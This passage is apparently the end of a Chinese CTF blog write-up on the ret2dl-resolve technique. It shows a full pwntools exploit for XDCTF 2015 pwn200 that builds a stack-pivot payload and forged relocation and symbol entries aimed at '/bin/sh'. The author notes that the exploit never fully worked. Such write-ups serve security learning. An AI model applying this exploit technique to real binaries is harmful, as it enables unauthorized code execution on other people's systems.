+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt_0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">bss_addr = elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr + <span class="number">0x500</span></span><br><span class="line"></span><br><span class="line">pppr_addr = <span class="number">0x08049351</span></span><br><span class="line">pop_ebp_addr = <span class="number">0x08049353</span> </span><br><span class="line">leave_addr = <span class="number">0x08049165</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_pivot</span>():</span><br><span class="line">    payload1 = <span class="string">b&quot;A&quot;</span> * (<span class="number">108</span> + <span class="number">4</span>)</span><br><span class="line">    payload1 += p32(read_plt)   </span><br><span class="line">    payload1 += p32(pppr_addr)</span><br><span class="line">    payload1 += p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">100</span>)</span><br><span class="line">    payload1 += p32(pop_ebp_addr)</span><br><span class="line">    payload1 += p32(bss_addr)</span><br><span class="line">    payload1 += p32(leave_addr)</span><br><span class="line">    io.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    reloc_index = bss_addr + <span class="number">28</span> - rel_plt</span><br><span class="line">    </span><br><span class="line">    r_sym = (bss_addr + <span class="number">40</span> - dynsym) // <span class="number">0x10</span> </span><br><span class="line">    r_type = <span class="number">0x7</span>                         </span><br><span class="line">    r_info = (r_sym &lt;&lt; <span class="number">8</span>) + (r_type &amp; <span class="number">0xff</span>)</span><br><span class="line">    fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">    </span><br><span class="line">    st_name = bss_addr + <span class="number">56</span> - dynstr</span><br><span class="line">    st_bind = <span class="number">0x1</span></span><br><span class="line">    st_type = <span class="number">0x2</span></span><br><span class="line">    st_info = (st_bind &lt;&lt; <span class="number">4</span>) + (st_type &amp; <span class="number">0xf</span>)</span><br><span class="line">    fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(st_info)     </span><br><span class="line">    </span><br><span class="line">    payload2 = <span class="string">b&quot;AAAA&quot;</span></span><br><span class="line">    payload2 += p32(plt_0)            </span><br><span class="line">    payload2 += p32(reloc_index)  </span><br><span class="line">    payload2 += <span class="string">b&quot;CCCC&quot;</span></span><br><span class="line">    payload2 += p32(<span class="number">1</span>) + p32(bss_addr + <span class="number">80</span>) + p32(<span class="built_in">len</span>(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    payload2 += fake_reloc</span><br><span class="line">    payload2 += <span class="string">b&quot;AAAA&quot;</span></span><br><span class="line">    payload2 += fake_sym </span><br><span class="line">    payload2 += <span class="string">b&quot;write\x00&quot;</span></span><br><span class="line">    payload2 += <span class="string">b&quot;A&quot;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2)) </span><br><span class="line">    payload2 += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">    payload2 += <span class="string">b&quot;A&quot;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))    </span><br><span class="line">    </span><br><span class="line">    io.sendline(payload2)</span><br><span class="line">    io.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    stack_pivot()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
+<p>&emsp;但是一直不成功，直到（2）的脚本有大概 1/7 的成功率，加入 p32(plt_0)、p32(reloc_index) 就一直不行，懒得调了。</p>
+
+  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/05/15/java-deserialization/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+
+
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    <!-- 
+    <div id="disqus_thread" class="ds-thread">
+        <script type="text/javascript">
+            /**
+             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+             */
+                /*
+                 var disqus_config = function () {
+                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
+                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                 };
+                 */
+            (function() { // DON'T EDIT BELOW THIS LINE
+                var d = document, s = d.createElement('script');
+
+                s.src = 'https://https-wd-2711-tech.disqus.com/embed.js';
+
+                s.setAttribute('data-timestamp', +new Date());
+                (d.head || d.body).appendChild(s);
+            })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
+                Disqus.</a></noscript>
+    </div> -->
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            appId: 'wLIJ70s3fPvW8WJPgVVAuWVR-gzGzoHsz',
+            appKey: 'NVGqxhUkqtFv2CbwmXXWjCdR'
+        })
+    </script>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-05-29 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/pwn/">pwn<span>3</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#dl-runtime-resolve-%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B"><span class="toc-article-text">dl_runtime_resolve 执行过程</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="toc-article-text">重定位表相关知识</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%AC%A6%E5%8F%B7%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86"><span class="toc-article-text">符号解析原理</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A"><span class="toc-article-text">延迟绑定</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ret2dl-resolve"><span class="toc-article-text">ret2dl-resolve</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-article-text">原理</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#XDCTF-2015-pwn200"><span class="toc-article-text">XDCTF 2015: pwn200</span></a></li></ol></li></ol></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+
+	<!-- copyright -->
+	<div>
+    <ul class="post-copyright">
+      <li class="post-copyright-author">
+      <strong>作者:  </strong>wd-z711</a>
+      </li>
+      <li class="post-copyright-link">
+      <strong>文章链接:  </strong>
+      <a href="/" target="_blank" title="">https://wd-2711.tech/</a>
+      </li>
+      <li class="post-copyright-license">
+        <strong>版权声明:   </strong>
+        本博客所有文章除特别声明外，均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+        许可协议。转载请注明出处!
+      </li>
+    </ul>
+  <div>
+ 	
+
+		
+
+
+</div><!-- row -->
+
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2024 wd-z711
+  
+      <!-- with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
+     <br> Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.     -->
+
+     <!-- <script type="text/javascript">
+      (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+      (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+      e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+      })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+      
+      _st('install','aB-vgeB8gEDrnRJuhceL','2.0.0');
+    </script> -->
+    </p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+   </html>
